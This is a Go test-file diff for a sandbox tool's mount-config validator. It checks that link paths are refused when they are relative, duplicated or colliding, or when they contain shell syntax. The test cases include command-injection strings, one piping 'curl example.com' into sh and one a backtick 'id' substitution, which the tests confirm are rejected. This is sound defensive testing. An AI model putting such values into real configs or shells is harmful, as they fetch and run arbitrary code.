@@ -476,6 +476,20 @@ func TestValidateMounts(t *testing.T) {
 		{"link $HOME ok", []Mount{{Host: "/tmp/x", Link: "$HOME/.ssh"}}, ""},
 		{"link tilde ok", []Mount{{Host: "/tmp/x", Link: "~/.ssh"}}, ""},
 		{"link absolute ok", []Mount{{Host: "/tmp/x", Link: "/etc/thing"}}, ""},
+		// ONE spelling of $HOME, deliberately: agent.LinkCommand rewrites `~/`
+		// and nothing else, so a `${HOME}/.ssh` would compare unequal to the
+		// sugar's `$HOME/.ssh` and slip past the collision refusal below.
+		{"link ${HOME} refused", []Mount{{Host: "/tmp/x", Link: "${HOME}/.ssh"}},
+			"mounts[0].link: must be absolute"},
+		// A relative host reaches `sbx create`'s argv verbatim. Refused with the
+		// SAME shape as worktree_root: the alternative is a refusal from
+		// sbx.CreateArgv, which fires after den has already created worktrees
+		// and branches the user then has to clean up by hand.
+		{"host must be absolute", []Mount{{Host: ".secrets", Link: "$HOME/.secrets"}},
+			"mounts[0].host: \".secrets\" is not an absolute path"},
+		// ONE fault, ONE line: a blank host must not also raise the
+		// absoluteness error on the same key.
+		{"blank host raises one error only", []Mount{{Host: "  "}}, "mounts[0].host: required"},
 		// Indexed key: a config may carry several mounts, and "mounts" alone would
 		// not say which one to fix. Prove the index is computed correctly for the
 		// second mount (index 1).
@@ -495,5 +509,97 @@ func TestValidateMounts(t *testing.T) {
 				t.Fatalf("want error containing %q, got %v", tc.want, err)
 			}
 		})
+	}
+}
+
+// The link is emitted UNESCAPED inside double quotes (agent.LinkCommand): it
+// has to be, so the VM's bash expands $HOME. That makes this validation the
+// only thing standing between config.yaml and the VM's startup shell — a
+// `$(...)` here runs inside the microVM on every boot, and a stray quote aborts
+// the whole startup script before den can say why.
+func TestValidateRefusesALinkThatIsNotAPath(t *testing.T) {
+	cases := []struct {
+		name string
+		link string
+		want string
+	}{
+		{"command substitution", "$HOME/x$(curl example.com | sh)", "command substitution"},
+		{"backtick", "$HOME/x`id`", "backtick"},
+		{"double quote", `$HOME/my"dir`, "quote or a backslash"},
+		{"backslash", `$HOME/my\dir`, "quote or a backslash"},
+		// `set -u` in the link script turns an unset variable into an aborted
+		// boot whose message names neither the mount nor the key. $HOME is the
+		// one expansion the field exists for; everything else is refused here,
+		// where the user can still read the reason.
+		{"other variable", "$HOME/$WORKSPACE", "expands a variable other than $HOME"},
+		{"other variable braced", "${XDG_CACHE_HOME}/x", "must be absolute"},
+		{"control character", "$HOME/a\tb", "control character"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			g := validGlobal()
+			g.Mounts = []Mount{{Host: "/tmp/x", Link: tc.link}}
+			err := errors.Join(g.Validate()...)
+			if err == nil {
+				t.Fatalf("want a refusal for link %q, got nil", tc.link)
+			}
+			if !strings.Contains(err.Error(), tc.want) {
+				t.Fatalf("want error containing %q, got %v", tc.want, err)
+			}
+			if !strings.Contains(err.Error(), "mounts[0].link") {
+				t.Errorf("the message must name the key to fix; got %v", err)
+			}
+		})
+	}
+}
+
+// Two mounts on one link target is a SILENT override, not a merge: the link
+// phase runs `ln -sfn` per entry in order, both print their success line, and
+// only the last one survives. den refuses rather than normalizing in silence.
+func TestValidateRefusesTwoMountsOnTheSameLink(t *testing.T) {
+	g := validGlobal()
+	g.Mounts = []Mount{
+		{Host: "/tmp/a", Link: "$HOME/x"},
+		{Host: "/tmp/b", Link: "$HOME/x"},
+	}
+	err := errors.Join(g.Validate()...)
+	if err == nil {
+		t.Fatal("want a refusal for two mounts sharing a link, got nil")
+	}
+	if !strings.Contains(err.Error(), "mounts[1].link") {
+		t.Errorf("the message must name the SECOND entry, the one to move; got %v", err)
+	}
+	if !strings.Contains(err.Error(), "mounts[0]") {
+		t.Errorf("the message must name what already holds the target; got %v", err)
+	}
+}
+
+// `~/x` and `$HOME/x` are the SAME VM path — agent.LinkCommand rewrites the
+// first into the second at emission. A duplicate check comparing the raw
+// strings would let this pair through, and the user's own `mounts[0]` would be
+// the one silently overwritten by the ssh.mode sugar, which is appended last.
+func TestValidateRefusesALinkCollidingWithTheSSHModeSugarWrittenAsTilde(t *testing.T) {
+	g := validGlobal()
+	g.SSH.Mode = "mount"
+	g.SSH.Dir = "/home/me/.ssh_work"
+	g.Mounts = []Mount{{Host: "/home/me/.ssh_personal", Link: "~/.ssh"}}
+	err := errors.Join(g.Validate()...)
+	if err == nil {
+		t.Fatal("want a refusal: ~/.ssh and the ssh.mode sugar's $HOME/.ssh are one path")
+	}
+	if !strings.Contains(err.Error(), "ssh.dir") {
+		t.Errorf("the message must name the ssh.mode sugar as the holder; got %v", err)
+	}
+}
+
+// The sugar is only generated in "mount" mode: outside it, `link: $HOME/.ssh`
+// collides with nothing and must stay legal.
+func TestValidateAcceptsASSHLinkOutsideMountMode(t *testing.T) {
+	g := validGlobal()
+	g.SSH.Mode = "agent-forward"
+	g.SSH.Dir = "/home/me/.ssh_work"
+	g.Mounts = []Mount{{Host: "/home/me/.ssh_personal", Link: SSHLinkTarget}}
+	if errs := g.Validate(); len(errs) > 0 {
+		t.Fatalf("want valid, got %v", errors.Join(errs...))
 	}
 }
